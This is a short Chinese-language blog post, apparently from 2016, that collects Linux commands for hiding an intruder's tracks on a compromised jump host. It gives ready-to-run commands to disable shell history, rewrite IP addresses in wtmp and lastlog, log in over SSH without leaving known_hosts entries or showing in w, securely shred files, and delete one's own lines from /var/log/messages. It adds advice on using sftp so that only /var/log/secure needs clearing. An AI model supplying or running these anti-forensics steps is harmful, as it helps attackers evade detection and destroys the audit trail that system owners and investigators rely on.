---
title: Linux跳板实用命令记录
tags:
- last
- shred
- utmpdump
- fwtmp
toc: flase
date: 2016-08-08 08:19:47
description:
categories: Share
---
上篇文章Linux下入侵匿迹隐藏的方法,是一些大牛的思路和操作命令,下面有些是已经重复的,主要是做个记录,把常用的命令都整理下

登录后执行下面命令,不记录历史命令(.bash_history)

```bash
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```
last命令结果修改ip(如果修改用户什么的,自己修改下把)
Centos
```bash
utmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r >/tmp/wtmp1 &&\mv  /tmp/wtmp1 /var/log/wtmp
```
lastlog 修改替换
```bash
sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog
```
<!-- more -->
不记录ssh公钥在本地.ssh目录中
```bash
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
```
多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原 -n, --iterations=N 覆盖N 次，而非使用默认的3 次。
```bash
shred -n 31337 -z -u filename
```
-n, --iterations=N 覆盖N 次，而非使用默认的3 次
-z, --zero 最后一次使用0 进行覆盖以隐藏覆盖动作
-u, --remove 覆盖后截断并删除文件

登录账户 w下管理员是看不到的
```bash
ssh -T somebody@8.8.8.8 /bin/bash –i
```
日志文件
/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一
/var/log/secure 与安全相关的日志信息
/var/log/maillog 与邮件相关的日志信息
/var/log/cron 与定时任务相关的日志信息
/var/log/spooler 与UUCP和news设备相关的日志信息
/var/log/boot.log 守护进程启动和停止相关的日志消息
/var/log/btmp – 记录所有失败登录信息 命令:lastb
/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)

删除部分日志,比如以当天日期或者自己的登录ip
```bash
sed  -i '/当前时间/'d  /var/log/messages
```
本来想自动提取当前时间,感觉麻烦,还是自己手动修改时间或者ip把,适用性也会 好点把

个人建议登录linux,使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,
但是在/var/log/secure会有sftp连接记录,只需要清理登录日志就可以了

